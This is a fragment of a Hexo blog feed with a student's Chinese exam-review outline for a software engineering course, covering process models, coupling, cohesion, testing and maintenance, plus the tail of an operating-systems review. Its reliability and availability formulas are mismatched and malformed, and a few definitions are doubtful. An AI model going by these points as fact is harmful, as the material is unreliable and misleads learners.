<li>可用性    拒绝服务</li>
</ul>
</li>
<li><p>非对称秘钥和对称秘钥的区别</p>
<p>对称密钥：私钥加密</p>
<p>非对称密钥：公钥加密，私钥解密</p>
</li>
</ol>
<h2 id="其他例题"><a href="#其他例题" class="headerlink" title="其他例题"></a>其他例题</h2><p>22级原题：</p>
<img src="/2022/07/06/%E8%A5%BF%E7%94%B5%E8%BD%AF%E5%B7%A5%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0%E7%BA%B2%E8%A6%81/image-20220706165954162.png" alt="image-20220706165954162" style="zoom:67%;" loading="lazy">

<p>物理地址和虚拟地址之间的转换：</p>
<img src="/2022/07/06/%E8%A5%BF%E7%94%B5%E8%BD%AF%E5%B7%A5%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0%E7%BA%B2%E8%A6%81/image-20220706170204542.png" alt="image-20220706170204542" style="zoom:67%;" loading="lazy">

<img src="/2022/07/06/%E8%A5%BF%E7%94%B5%E8%BD%AF%E5%B7%A5%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0%E7%BA%B2%E8%A6%81/image-20220706170258231.png" alt="image-20220706170258231" style="zoom:67%;" loading="lazy">

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>总体来说22级的考试难度不算很大，但是成绩摆在那边，我不好说。考试之前就一直再说今年要改啥啥啥的，确实改了，没有填空题了，但是感觉核心的内容还是没有太大变换。</li>
<li>选择题有点难，我当时蒙了两个好像，简答大题也有没看到的知识点。</li>
<li>以上知识点的总结难免有错误或者不足的地方，对今年考试的试题我也忘得差不多了，如有错误请指正。</li>
</ol>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
  </entry>
  <entry>
    <title>西电软件工程概论复习纲要</title>
    <url>/2022/07/07/%E8%A5%BF%E7%94%B5%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%A6%82%E8%AE%BA%E5%A4%8D%E4%B9%A0%E7%BA%B2%E8%A6%81/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><h2 id="第一章-概述（Introduction）"><a href="#第一章-概述（Introduction）" class="headerlink" title="第一章  概述（Introduction）"></a>第一章  概述（Introduction）</h2><p>1、软件 &#x3D; <strong>程序 + 数据 + 文档</strong>  <strong>program(instruction)</strong> , <strong>data(structure)</strong> and <strong>documents</strong></p>
<p>2、软件工程：使用 <strong>系统的，有规律的，可测量</strong>的方法去<strong>开发，运行，维护</strong>软件。</p>
<p>Software engineering means the application of a <strong>systematic , displined and measureable</strong> approach to the <strong>development , operation and maintenance</strong> of software.</p>
<p>3、三个模型（常考选择题，22级考）</p>
<p>The <strong>McCall’s quality model</strong> concerns <strong>the quality of the software product</strong>      关注软件产品的质量</p>
<p><strong>CMM</strong> concerns <strong>the quality of the process</strong> of development software product    关注软件产品开发过程的质量</p>
<p><strong>ROI</strong> concerns <strong>the quality of</strong> the context of <strong>the bussiness environment</strong>            关注业务环境的质量</p>
<span id="more"></span>

<p>4、谁做软件工程：<strong>customer （consumer）+ developer + user</strong>    消费者+开发者+用户</p>
<p>5、系统是<strong>对象和活动</strong>的集合，加上对象和活动之间<strong>关系的描述</strong>。</p>
<p>system is a collection of <strong>objects</strong> and <strong>activities</strong>, plus <strong>a description of the relationships</strong> that tie the objects and activities together.</p>
<p>6、任何要设计的实体，我们都必须做<strong>分析，设计，施工，验证和管理</strong></p>
<p>Any entity to be engineered ,we must do <strong>analyst</strong> , <strong>designer</strong>, <strong>construction</strong>, <strong>verification</strong> and <strong>managment</strong></p>
<p>7、什么是软件工程：软件工程是用计算机或计算机技术来求解实际问题的研究或实践。计算机科学家研究计算机的结构及理论，以及计算机的功能，而软件工程是计算机科学的一部分，因为软件工程师应用计算机科学研究的成果来构建工具和技术以满足客户的需求。</p>
<p>8、软件开发步骤：需求分析和定义、系统设计、程序设计、程序实现（编程）、单元&#x2F;集成测试、系统测试、交付系统、系统维护</p>
<h2 id="第二章-过程和生命周期（Modeling-the-Process-and-Life-Cycle）"><a href="#第二章-过程和生命周期（Modeling-the-Process-and-Life-Cycle）" class="headerlink" title="第二章  过程和生命周期（Modeling the Process and Life Cycle）"></a>第二章  过程和生命周期（Modeling the Process and Life Cycle）</h2><p>1、过程是一系列的顺序任务，<strong>过程 &#x3D; 步骤</strong> —— 包含：<strong>活动 + 约束 + 资源</strong></p>
<p>We can think a set of ordered tasks as a <strong>process</strong>, a series of <strong>steps</strong> , including <strong>activities</strong> , <strong>constrains</strong> and <strong>resources</strong></p>
<p>2、当过程涉及到构建某些<strong>产品</strong>时，我们有时将过程称为<strong>生命周期</strong></p>
<p>When the process involves building of some <strong>product</strong> , we sometime refer to the Process as a <strong>lifecycle</strong></p>
<p>3、软件的生命周期：<strong>概念、实现、交付、使用、维护</strong></p>
<p>The life cycle of a software product include <strong>conception , implementation, delivery, use,</strong> and <strong>maintenance</strong></p>
<p>4、软件过程模型（software process models）超级重点！！！（每一种模型的概念、特点以及优缺点，特别是优缺点全文背诵，22年考了瀑布模型的概念及优缺点）</p>
<ul>
<li><p><strong>瀑布模型 waterfall model</strong></p>
<p>概念：瀑布模型包括<strong>需求分析，系统设计，程序设计，编码，单元和集成测试，系统测试，验收测试以及运维</strong>步骤。</p>
<p>The waterfall mode include <strong>requirement analysis, system design, program design, coding, unit &amp; integration testing, system testing, acceptance testing ,and operation &amp; maintenance</strong> steps.</p>
<p>特点：<strong>有效性</strong>确保系统已实现所有要求，但<strong>验证</strong>可确保每个函数正常工作。</p>
<p>The <strong>validation</strong> ensures that the system has implemented all of the requirement, But the <strong>verification</strong> ensures that each function works correctly.</p>
</li>
</ul>
<p>​		<strong>优点：（1）可强迫开发人员采用规范化的方法</strong></p>
<p>​					<strong>（2）严格地规定了每个阶段必须提交的文档</strong></p>
<p>​					<strong>（3）要求每个阶段交出的所有产品都必须是经过验证的</strong></p>
<p>​		<strong>缺点：（1）由于瀑布模型几乎完全依赖于书面的规格说明，很可能导致最终开发出的软件产品不能真正满足用户的需要</strong></p>
<p>​					<strong>（2）只适用于项目开始时需求就已经确定的情况</strong></p>
<ul>
<li><p><strong>V模型</strong> <strong>V model</strong> </p>
<p>概念：V模型更明确地说明了瀑布模型中隐藏的一些<strong>迭代和返工</strong>，是瀑布模型的变种</p>
<p>The <strong>V model</strong> makes more explicit some of the <strong>iteration</strong> and <strong>rework</strong> that are hidden In the waterfall</p>
</li>
</ul>
<p>​		特点：（1）采用参与测试来验证程序设计</p>
<p>​					（2）采用集成测试来验证体系结构设计</p>
<p>​					（3）采用验收测试来确认需求</p>
<p>​					（4）验证过程中发现问题即可在执行后续测试步骤前重新执行左边步骤对软件修正</p>
<ul>
<li><p><strong>原型化模型</strong>  <strong>prototyping model</strong> </p>
<p>概念：在需求分析阶段对软件进行初步的分析和定义，快速开发出简单的软件原型并向用户展示，用户对软件原型进行测评后进一步提出进要求，开发人员的原型修改到用户满意为止。因此<strong>原型模型的开发更能符合需求，适合市场导向（market-driven）的产品</strong>。</p>
<p>A prototyping model is a partially developed product that enable customers and developers。 To examine some aspect of the proposed system and decide if it is suitable or appropriate for the final product.</p>
<p><strong>优点：（1）有助于满足用户的真实需求</strong></p>
<p>​			<strong>（2）原型系统已经通过与用户进行交互而得到验证，据此产生的规格文档能正确描述用户的需求</strong></p>
<p>​			<strong>（3）软件产品的开发基本上是按线性顺序进行</strong></p>
<p>​			<strong>（4）建造出原型系统后，开发人员可以加速软件开发的过程，节约软件开发成本</strong></p>
</li>
<li><p><strong>增量模型</strong>  <strong>incremental model</strong>    (画大饼模型zzz)</p>
<p>增量：将系统功能划分为诸多子系统，先开发具有一个小功能的子系统，之后不断在子系统上增加新的功能来逐渐满足所有需求</p>
<p>迭代：第一次提交的产品就是一个完整的系统，之后在该系统的基础上不断修改，不断开发出新的版本，但是每个版本都是完整可运行的版本</p>
<p><strong>优点：（1）能在较短时间内向用户提交完成一些有用功能的工作产品</strong></p>
<p>​			<strong>（2）逐步增加产品的功能可以使用户有较充裕的学习时间和适应新产品</strong>		</p>
<p>​			<strong>（3）项目失败的风险较低</strong></p>
<p>​			<strong>（4）优先级最高的服务首先交付，然后再将其他增量构件逐次集成进来，这意味着最重要的部分将接受最多的测试</strong></p>
<p><strong>缺点：（1）与其他模型相比需要更精心的设计</strong></p>
</li>
<li><p><strong>螺旋式模型  spiral model</strong> </p>
<p>概念：瀑布模型与原型模型的组合，既可以周期性地验证客户的需求，又可以分阶段进行开发工作，能保证软件在遇到较大风险时停止，大大增强了软件的<strong>风险防控能力</strong>。但是过程很复杂，需要开发人员有丰富的风险评估能力和专业知识，适合大型项目的开发。</p>
<p>The spiral model combine the development activities with <strong>risk</strong> management to minimize and control the <strong>risk control</strong>。</p>
<p><strong>优点：（1）对可选方案和约束条件的强调有利于已有软件的重用，也有助于把软件质量作为软件开发的一个重要目标</strong></p>
<p>​			<strong>（2）减少了过多测试或者测试不足带来的风险</strong>		</p>
<p>​			<strong>（3）维护只是模型的另一个周期，因此在维护和开发之间并没有本质区别</strong></p>
</li>
</ul>
<p>​		<strong>缺点：（1）要求开发人员必须具有丰富的风险评估经验和专门知识</strong></p>
<h2 id="第三章-规划和管理项目（Planning-and-Managing-the-Project）"><a href="#第三章-规划和管理项目（Planning-and-Managing-the-Project）" class="headerlink" title="第三章  规划和管理项目（Planning and Managing the Project）"></a>第三章  规划和管理项目（Planning and Managing the Project）</h2><p>底下1-5理解即可感觉不常考</p>
<p>1、项目进度表通过列举项目的阶段，并将每个阶段分解成独立的待完成的<strong>任务或活动</strong>，来描述一个特定项目的软件开发周期。</p>
<p>A project schedule describes the software development cycle for a particular project by enumerating the phases or stages of the project and breaking each into discrete <strong>tasks or activities</strong> to be done.</p>
<p>2、计划是一个<strong>时间线</strong>，显示活动何时开始和结束，以及相关开发产品何时准备就绪。</p>
<p>The Schedule is a <strong>timeline</strong> that shows when activities will begin and end, and When the related development products will be ready.</p>
<p>3、交付物，即客户希望在项目开发期间看到的<strong>项目</strong>。</p>
<p>The Deliverables , that is the <strong>item</strong> that the customer expects to see during project development.</p>
<p>4、<strong>活动</strong>是在一段时间内发生的项目的一部分</p>
<p>An <strong>activity</strong> is a part of the project that takes place over a period of time.</p>
<p>5、<strong>里程碑</strong>是一个活动的完成，一个特定的时间点。</p>
<p>A <strong>milestone</strong> is the completion of an activity，a particular point in time.</p>
<p>6、<strong>关键路径方法</strong>  <strong>Critical Path Method</strong>       必考大题！！！！一定要弄懂，具体怎么做看笔记</p>
<p>7、<strong>交流线  lines of communication</strong>  ：如果一个工作中有n个人，那么一共有n（n-1）&#x2F; 2条交流线</p>
<p>8、个性  characteristics ：<strong>Extrovert（外向）Introvert（内向）Intuitive（直觉  Rational（理智）</strong></p>
<p>9、组织形式：（选择题）</p>
<p>​	  首席程序员团队  <strong>chief programmer team</strong>：高效的组织方式</p>
<p>​	  适用于：<strong>大项目 large scale，高确定性 high certainty，重复性 repetition</strong></p>
<p>​	 无私的方法？？？ <strong>egoless approach</strong></p>
<p>​	适用于：<strong>小项目 small scale，新技术 new technology，不确定性 uncertain</strong></p>
<p>10、<img src="/2022/07/07/%E8%A5%BF%E7%94%B5%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%A6%82%E8%AE%BA%E5%A4%8D%E4%B9%A0%E7%BA%B2%E8%A6%81/image-20220527214156078.png" alt="image-20220527214156078" loading="lazy"></p>
<p>（要知道每个模块包含什么，特别是风险评估）</p>
<p>风险评估 risk assessment、风险识别 risk identification、风险分析 risk analysis、风险分级 risk prioritization、风险控制 risk control、减少风险 reduce risk、风险管理计划 risk management planning、风险解决 Risk resolution</p>
<p>11、Give some diliverables：列出一些可交付物</p>
<p>​		文件<br>​		功能演示<br>​		准确性演示<br>​		子系统演示<br>​		可靠性、性能或安全性演示</p>
<p>12、Briefly describe the characteristic of software development team’s individual：描述软件开发团队个体的特征</p>
<p>​		执行工作的能力<br>​		对工作的兴趣<br>​		使用类似工具或语言的经验<br>​		类似技术的经验<br>​		具有类似开发环境的经验<br>​		训练<br>​		与他人沟通的能力</p>
<h2 id="第四章-需求分析（Capture-the-Requirements）"><a href="#第四章-需求分析（Capture-the-Requirements）" class="headerlink" title="第四章  需求分析（Capture the Requirements）"></a>第四章  需求分析（Capture the Requirements）</h2><p>1、需求是<strong>期望行为</strong>的一种<strong>表达</strong>。</p>
<p>A requirement is an <strong>expression</strong> of <strong>desired behavior</strong></p>
<p>2、The process for capturing the requirement has four steps, there are <strong>elicitation，analysis , specification,and validation。</strong></p>
<p>捕获需求的过程有四个步骤，分别是<strong>抽取、分析、规范和验证</strong>。</p>
<p>3、There four type of requirement, they are the <strong>fundmental requirement , Quality requirements&#x2F;nonfunctional requirements, design contraist and process constraist</strong>.（了解四种需求的概念，选择题可以判断，22年考了简答题，其对应的概念以及举例）</p>
<p><strong>功能性需求</strong></p>
<p>系统应与外部系统 X 通信。   System shall communicate with external system X.    </p>
<p>必须满足哪些条件才能发送消息。   What conditions must be met for a message to be sent.</p>
<p><strong>非功能性需求（质量需求）</strong></p>
<p>在初始日期后不超过4小时分发的薪水支票将被读取。   Paychecks distributed no more than 4 hours after initial date are read. </p>
<p>系统限制高级管理人员的访问权限。   System limits access to senior managers.      </p>
<p><strong>设计约束</strong>     接口与组件限制设计</p>
<p><strong>过程约束</strong>    技术和资源限制</p>
<p>4、<strong>用户、设计者、测试人员</strong>是需求文档的直接使用者，而程序员不是。</p>
<p><strong>Users, designers, and testers</strong> are direct users of requirements documents, not programmers.</p>
<p>5、需求的特性：</p>
<p>correct、consistent 一致性 、ambigious 模棱两可的、complete、feasible 可行的、relevent 相关的、testable 可测试的、traceable 可追踪的 、unverifiable 无法验证的</p>
<p>6、<strong>Requirement Modeling notations  需求建模符号</strong>       必考大题！！（知道每一种建模符号的概念以及对应的uml图。22年考的是建模题，第一问好像是数据流建模，第二问是让你画uml的序列图…我没写出来）</p>
<ul>
<li><p><strong>Entity-relationship diagrams（ERD&#x2F;E-R）</strong></p>
<p><strong>表示概念模型的一种方法，包含实体，联系，属性三个要素。对应UML中的类图。</strong></p>
<p>A way to represent a conceptual model that contains three elements: <strong>entity, relationship, and attribute</strong>. Corresponds to a <strong>class diagram</strong> in UML.</p>
</li>
<li><p><strong>Event traces  事迹追踪</strong></p>
<p><strong>对现实世界实体之间交换的事件序列的图形描述。对应UML中的序列图。</strong></p>
<p>A graphical description of the sequence of events exchanged between real-world entities. Corresponds to a <strong>sequence diagram</strong> in UML.</p>
</li>
<li><p><strong>State machines  状态机</strong></p>
<p><strong>系统与环境之间所有对话的图形化描述。对应UML中的状态图。</strong></p>
<p>A graphical description of all conversations between the system and the environment. Corresponds to a <strong>state diagram</strong> in UML.</p>
</li>
<li><p><strong>Data-flow diagrams (DFD)  数据流图</strong></p>
<p><strong>对功能以及从一个功能到另一个功能的数据流建模。对应UML中的用例图</strong></p>
<p>Model features and the flow of data from one feature to another. Corresponding to the <strong>use case diagram</strong> in UML</p>
</li>
</ul>
<p>7-10为大题考察可能性较低，了解即可</p>
<p>7、Briefly describe the functions of the two approaches of prototyping.</p>
<p><strong>一次性原型</strong>是为了更多地了解问题或建议的<strong>解决方案</strong>而开发的软件，它<strong>绝不是交付软件的一部分</strong>。</p>
<p><strong>throwaway prototyping</strong>：A throwaway prototype is software that is developed to learn more about a problem or about a proposed solution, and that is never intended to be part of the delivered software.</p>
<p><strong>进化原型</strong>是一种软件，开发它不仅是为了<strong>帮助我们回答问题</strong>，而且是为了<strong>整合到最终产品中</strong>。</p>
<p><strong>evolution prototyping</strong>：an evolutionary prototype is software that is developed not only to help us answer questions but also to be incorporated into the final product.</p>
<p>8、Briefly describe the function of the four types of the requirement.</p>
<p><strong>functional requirement</strong>：describes required behavior in terms of required activities</p>
<p>根据需要的活动描述需要的行为</p>
<p><strong>qualtity requirement</strong>：describes some quality characteristic that the software solution must possess</p>
<p>描述软件解决方案必须具备的一些质量特征</p>
<p><strong>process constraint</strong>：a restriction on the techniques or resources that can be used to build the system</p>
<p>对可用于构建系统的技术或资源的限制</p>
<p><strong>design constraint</strong>：a design decision, such as choice of platform or interface components, that has already been made and that restricts the set of solutions to our problem</p>
<p>一个已经做出的设计决策，例如平台或接口组件的选择，它限制了我们的问题的解决方案集</p>
<p>9、Briefly describe the roles of the seven groups of stakeholders.简要描述七组利益相关者的角色</p>
<p>客户：谁是为要开发的软件付费的人<br>客户：软件开发后购买<br>用户：使用系统<br>领域专家：熟悉软件必须自动化的问题<br>市场研究人员：进行调查以确定未来趋势和潜在客户<br>律师或审计师：熟悉政府、安全或法律要求<br>软件工程师或其他技术专家</p>
<p>10、Briefly describe the functions of three core construct of ERD.</p>
<p><strong>entity</strong>：represents a collection (sometimes called a class) of real-world objects that have common properties and behaviors.</p>
<p>表示具有公共属性和行为的现实世界对象的集合(有时称为类)。</p>
<p><strong>relationship</strong>：an edge between two entities, with a diamond in the middle of the edge specifying the type of relationship</p>
<p>两个实体之间的边缘，边缘中间的菱形指定关系类型。</p>
<p><strong>atrribute</strong>：an annotation on an entity that describes data or properties associated with the entity.</p>
<p>实体上的一种注释，用于描述与该实体相关联的数据或属性。</p>
<h2 id="第五章-设计体系结构（Design-the-Architecture）"><a href="#第五章-设计体系结构（Design-the-Architecture）" class="headerlink" title="第五章  设计体系结构（Design the Architecture）"></a>第五章  设计体系结构（Design the Architecture）</h2><p>1、软件体系结构&#x3D;构件，连接件，约束</p>
<p>component(构件)、connector(连接件)、constraint(约束)</p>
<p>2、<strong>体系结构样式  Architecture styles</strong>     小重点！（选择题可以判别是哪种体系样式结构，这个好像考了选择没考简答）</p>
<ul>
<li><p><strong>pipes and filers 管道和过滤器</strong></p>
<p>每个模块都有一组输入与输出，可做编译器（compiler）</p>
</li>
<li><p><strong>Publish-subscribe  发布-订阅</strong></p>
<p>在发布-订阅体系结构中，订阅组件通过它表达对事件的兴趣。当另一个组件发生该事件时，订阅组件将得到通知。组件component</p>
</li>
<li><p><strong>Client&#x2F;Server  客户端&#x2F;服务端</strong></p>
<p>在客户机-服务器架构中，<strong>服务器</strong>组件提供服务，而<strong>客户机</strong>使用请求&#x2F;应答协议访问它们。</p>
</li>
<li><p><strong>Repositories   存储库架构</strong></p>
<p>用于数据存储、搜索引擎 search engine 、库 libraries 等</p>
</li>
<li><p><strong>peer-to-peer</strong>  </p>
<p>在对等体系结构中，每个对等点作为它自己的进程执行，并且作为其他对等组件的客户端和服务器。</p>
</li>
<li><p><strong>layering  分层体系</strong></p>
<p>High levels of <strong>abstraction</strong>  高级<strong>抽象</strong></p>
</li>
</ul>
<h2 id="第六章-模块设计（Design-the-Modules）"><a href="#第六章-模块设计（Design-the-Modules）" class="headerlink" title="第六章  模块设计（Design the Modules）"></a>第六章  模块设计（Design the Modules）</h2><p>1、<strong>六耦合  coupling</strong>  超级重点！！！(知道构建耦合概念，可以列举六耦合名称，选择题可以判别是那种耦合，22年考了简答，列举几个耦合类型并解释)</p>
<p><strong>构建耦合 component coupling ：两个构件之间相互依赖或者相互作用的程度的度量</strong></p>
<ul>
<li><strong>Content coupling 内容耦合</strong> ：一个模块直接使用或者修改另一个模块内部的数据，或者通过非正常的入口，直接进入另一个模块的内 部。比如在某个组件的分支操作，直接进入到了另一个组件之中（one component branches into the middle of another component）。 </li>
<li><strong>Common coupling 公共耦合</strong>：几个模块对一个公共的数据区域进行数据上的操作 </li>
<li><strong>Control coupling 控制耦合</strong>：一个模块通过传递参数，或者函数的返回值来控制另一个模块的行为 </li>
<li><strong>Stamp coupling 特征&#x2F;标记耦合</strong>：复杂的数据结构在模块之间传递            当复杂的数据结构在模块之间传递时，我们说模块之间存在图章耦合</li>
<li><strong>Data coupling 数据耦合</strong> 几个模块共享几个数据的值 if only data value, and not structured data, are passed, then the modules are connected by data coupling .</li>
<li><strong>Uncoupled  无耦合</strong></li>
</ul>
<p>2、<strong>七内聚  cohesion</strong>    超级重点！！！(知道构建内聚概念，可以列举七内聚名称，选择题可以判别是那种内聚)</p>
<p><strong>构建内聚：一个构建功能强度的度量</strong></p>
<ul>
<li><strong>Coincidental cohesion  巧合内聚</strong>：模块之间毫无关系，相互之间是松散的</li>
<li><strong>Logical cohesion  逻辑内聚</strong>：逻辑内聚力，如果它的各个部分仅通过其代码的逻辑结构相关。  例如 if-else</li>
<li><strong>Temporal cohesion 时间内聚</strong>：一个模块完成的许多功能必须在相近的时间点完成，比如系统的初始化，这些功能通过时间因素关联在 一起。</li>
<li><strong>Procedural cohesion  过程内聚</strong>：允许在调用前面的构件或操作之后，马上调用后面的构件或操作，即使两者之间没有数据进行传递</li>
<li><strong>Communication cohesion  通信内聚</strong>：一个模块的所有成分都操作同一数据集或者生成同一数据集  data set</li>
<li><strong>sequencial cohesion 顺序内聚</strong>：指一个模块中各个处理元素都密切相关于同一功能且必须顺序执行,前一功能元素的输出就是下一功能元 素的输入 </li>
<li><strong>Functional cohesion 功能内聚</strong>：一个模块中包含对单个函数至关重要的所有元素，而该模块的所有元素对该函数的性能都至关重要。</li>
</ul>
<h2 id="第七章-编程（Writing-the-programs）"><a href="#第七章-编程（Writing-the-programs）" class="headerlink" title="第七章  编程（Writing the programs）"></a>第七章  编程（Writing the programs）</h2><p>1、即使在编写代码本身时，许多人也会参与其中，并且需要<strong>合作和协调</strong></p>
<p>Even when writing the code itself, many people are sually involved, and a great deal of <strong>coorperation and coordination</strong> is required</p>
<p>2、程序三要素：<strong>控制结构 Control Structural  算法 Algorithm  数据结构 Data Structure</strong></p>
<p>3、<strong>文档  Documentation</strong>（要知道标题注释块包含的内容）</p>
<p><img src="/2022/07/07/%E8%A5%BF%E7%94%B5%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%A6%82%E8%AE%BA%E5%A4%8D%E4%B9%A0%E7%BA%B2%E8%A6%81/image-20220707095952590.png" alt="image-20220707095952590" loading="lazy"></p>
<h2 id="第八章-测试程序（Testing-the-Program）"><a href="#第八章-测试程序（Testing-the-Program）" class="headerlink" title="第八章  测试程序（Testing the Program）"></a>第八章  测试程序（Testing the Program）</h2><p>1、<strong>测试步骤  testing steps</strong>   （重点，理解并记住，大题，选择）：单元测试和集成测试后进行系统测试，系统测试包含四个步骤</p>
<ul>
<li><p><strong>单元测试  unit testing</strong> ：测试单个模块</p>
</li>
<li><p><strong>集成测试 Integration testing</strong> ：测试集成的模块</p>
</li>
<li><p><strong>系统测试 System testing</strong> ：测试整个软件系统</p>
<ol>
<li><strong>功能测试  function test</strong>：检查集成的系统是否按照需求中指定的那样执行它的功能</li>
<li><strong>性能测试  performance test</strong>  :将集成的构建与非功能呢个需求进行比较</li>
<li><strong>验收测试  acceptance test</strong>：客户参与的测试，目标是确保系统复合它们对需求的理解</li>
<li><strong>安装测试 installation test</strong> ：在实际运行环境中的测试</li>
</ol>
</li>
</ul>
<p>补充知识点：<strong>回归测试 regression test：回归测试适用于新的版本或发布的一种测试，以验证与旧版本或发布相比，他是否仍然以同样的方式执行相同的功能。由于在测试过程中可能在修复已有故障的同时引入新的故障，故需要进行回归测试。</strong></p>
<p>2、 <strong>测试技术  Testing techniques</strong>（选择）</p>
<p><img src="/2022/07/07/%E8%A5%BF%E7%94%B5%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%A6%82%E8%AE%BA%E5%A4%8D%E4%B9%A0%E7%BA%B2%E8%A6%81/image-20220707100059278.png" alt="image-20220707100059278" loading="lazy"></p>
<p><strong>穷举测试 exhaustive test</strong></p>
<p>3、<strong>代码审查  code review</strong>（重点，会考大题）</p>
<p><strong>代码走查：程序员向评审小组提交代码及其相关文档，然后评议小组评论其正确性。</strong> </p>
<p><strong>代码审查：与走查类似但是更正式。按照一个事先准备好的问题清单来检查代码和文档</strong></p>
<p>4、<strong>Logic flow</strong> ：这个的解法很简单，就是找到所有可能走完的路径就行了。  （大题必考！！！！22年没考）</p>
<p>5、<strong>集成测试的几种方式 Integration testing</strong>（小重点，选择题）</p>
<ul>
<li><p><strong>自下而上的集成  Bottom-up integration</strong></p>
<p>先测试软件最底部的各个独立组件再向上测试集成的组件。测试每一个集成的组件都要连带其下所属的 底层组件一并测试一遍，即将他们看作一个整体进行测试。 需要注意的是这种测试需要为编写驱动（driver components）</p>
</li>
<li><p><strong>自上而下的集成  Top-down integration</strong> </p>
<p>测试主控模块，由桩模块代替所有直属模块。利用广度优先遍历或深度优先遍历，从根节点开始向下遍历，遍历结点的顺序就是测试的顺序。</p>
</li>
<li><p><strong>大爆炸集成  Big-bang integration</strong> </p>
<p>类似于黑盒测试，直接将所有组件组装成一个整体，对整个系统进行测试。</p>
</li>
<li><p><strong>三明治集成  Sandwich integration</strong></p>
<p>目标层（中间层）的选择问题。混合使用自底向上和自顶向下的测试方式，<strong>先采用自顶向下测试单个组件，再利用自底向上将已测试的 单个组件组装成一个整体测试。</strong></p>
<p>eg：</p>
</li>
</ul>
<img src="/2022/07/07/%E8%A5%BF%E7%94%B5%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%A6%82%E8%AE%BA%E5%A4%8D%E4%B9%A0%E7%BA%B2%E8%A6%81/image-20220707100334633.png" alt="image-20220707100334633" style="zoom: 33%;" loading="lazy">



<h2 id="第九章-测试系统（Testing-the-system）"><a href="#第九章-测试系统（Testing-the-system）" class="headerlink" title="第九章  测试系统（Testing the system）"></a>第九章  测试系统（Testing the system）</h2><p>1、<strong>性能测试的种类  Types of performance testing</strong>（选择题居多，也有答题，要理解概念；回归测试概念考过简答）</p>
<ul>
<li><strong>压力测试 stress test</strong> ：在常规条件下运行软件，而是在计算机数量较少或系统资源匮乏下测试软件的性能，通常测试的 资源包括内部内存、CPU可用性、磁盘空间、网络带宽 </li>
<li><strong>容量测试 Volumne test</strong>：产生大量测试数据来测试软件某项指标的极限值，在给定时间内能够处理的最大负载量，从而让开 发商和用户了解该软件系统的承受能力或提供服务能力。 </li>
<li><strong>配置测试 configuration test</strong>：对电脑硬件的测试，通过对被测系统的软硬件环境进行调整，了解各种不同环境对系统性能的影响 程度，进而找到系统各项资源的最优分配原则。 </li>
<li><strong>兼容性测试 compatibility test</strong> ：检查软件之间能否相互正确地交流共享信息。测试内容主要为不同软件版本的兼容性；不同操作系 统下软件的兼容性；新旧数据之间的兼容性等。 </li>
<li><strong>回归测试 regression test</strong> ：回归测试是用于软件新版本的一种测试，在修改了旧代码后，重新对相同的功能进行测试，以确认修改没有引入新的错误或导致其他代码产生错误。 由于在正常情况下，对旧代码的修改往往会引入新的错误，因此回归测试的很必要的</li>
</ul>
<p>2、<strong>可靠性、可用性和可维护性 Reliability, availability, and maintainability</strong>（超级重点！！大题选择题）</p>
<p><strong>可靠性：指一个系统对于给定的时间间隔内、在给定条件下无失效运作的概率</strong></p>
<p><strong>Mean Time To Failure      R &#x3D; MTTF&#x2F;(1+MTTF)</strong></p>
<p><strong>可维护性：在给定的使用条件下，在规定的时间间隔内，使用规定的过程和资源完成维护活动的概率</strong></p>
<p><strong>Mean Time between Faulure        A &#x3D; MTBF(1+MTBF)</strong></p>
<p><strong>可用性：在给定的时间点上，一个系统能够按照规格说明正确运作的概率</strong></p>
<p><strong>Mean Time to Repair     M &#x3D; 1&#x2F;(1+MTTR)</strong></p>
<h2 id="第十章-交付系统（Delivering-the-System）"><a href="#第十章-交付系统（Delivering-the-System）" class="headerlink" title="第十章  交付系统（Delivering the System）"></a>第十章  交付系统（Delivering the System）</h2><p>没啥重点，略过</p>
<h2 id="第十一章-维护系统（Maintaining-the-System）、"><a href="#第十一章-维护系统（Maintaining-the-System）、" class="headerlink" title="第十一章  维护系统（Maintaining the System）、"></a>第十一章  维护系统（Maintaining the System）、</h2><p>1、<strong>Four types of maintenance activities</strong> （重点，选择，22年考了大题好像）</p>
<ul>
<li><p><strong>Corrective maintenance 改正性维护</strong> </p>
<p>为了控制日常系统功能，维护团队对故障引起的问题做出响应。这种维护称为纠正性维护。</p>
</li>
<li><p><strong>Adaptive maintenance 适应性维护</strong> </p>
<p>保持对系统修改的控制 假设现有的数据库管理系统升级到新版本，这种维护称为适应性维护。</p>
</li>
<li><p><strong>Perfective maintenance 完善性维护</strong> </p>
<p>完善现有功能 如果客户想添加新功能，这种维护称为完善维护。</p>
</li>
<li><p><strong>Preventive maintenance 预防性维护</strong> </p>
<p>防止系统性能下降到不可接受的水准</p>
</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>概念性的东西比较多，需要背诵。22年选择题考的比较怪反正，有几题我是蒙的，简答题如果上述都掌握完全没有问题，建模题就是<strong>Requirement Modeling notations  需求建模符号</strong> 那一部分，建议把ppt和书上的图都看一下。大题是一个判定表和关键路径。</p>
]]></content>
      <categories>
        <category>软件工程概论</category>
      </categories>
  </entry>
  <entry>
    <title>计算机图形学三：光栅化-Rasterization</title>
    <url>/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/</url>
